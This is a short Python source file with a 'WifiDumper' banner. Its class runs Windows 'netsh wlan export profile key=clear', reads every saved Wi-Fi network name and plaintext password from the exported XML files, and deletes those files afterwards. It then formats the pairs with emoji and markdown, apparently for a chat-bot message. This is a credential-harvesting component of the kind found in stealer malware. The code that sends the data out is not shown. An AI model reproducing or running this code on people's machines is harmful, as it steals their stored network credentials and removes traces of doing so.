import subprocess as sp
from xml.dom import minidom
from os import listdir, remove
"""
oooooo   oooooo     oooo  o8o   .o88o.  o8o  oooooooooo.
 `888.    `888.     .8'   `"'   888 `"  `"'  `888'   `Y8b
  `888.   .8888.   .8'   oooo  o888oo  oooo   888      888 oooo  oooo  ooo. .oo.  .oo.   oo.ooooo.   .ooooo.  oooo d8b 
   `888  .8'`888. .8'    `888   888    `888   888      888 `888  `888  `888P"Y88bP"Y88b   888' `88b d88' `88b `888""8P 
    `888.8'  `888.8'      888   888     888   888      888  888   888   888   888   888   888   888 888ooo888  888     
     `888'    `888'       888   888     888   888     d88'  888   888   888   888   888   888   888 888    .o  888     
      `8'      `8'       o888o o888o   o888o o888bood8P'    `V88V"V8P' o888o o888o o888o  888bod8P' `Y8bod8P' d888b    
                                                                                          888
                                                                                         o888o
"""
class WifiDumper:
    def __init__(self) -> None:
        pass

    def extract_all(self) -> dict[str:str]:
        sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
        xmls = []
        wifis = {} 
        for file in listdir():
            if file.endswith(".xml") and file.startswith("Wi-Fi"):
                xmls.append(file)

        for xml in xmls:
            file = minidom.parse(xml)
            psw = file.getElementsByTagName("keyMaterial")[0].firstChild.data
            name = file.getElementsByTagName("name")[0].firstChild.data

            wifis.update({name:psw})

        for file in xmls:
            remove(file)
        return wifis

    def __str__(self) -> str:
        return "\n".join([f"🛜 *{k}*\n🔑 `{v}`\n" for k,v in self.extract_all().items()])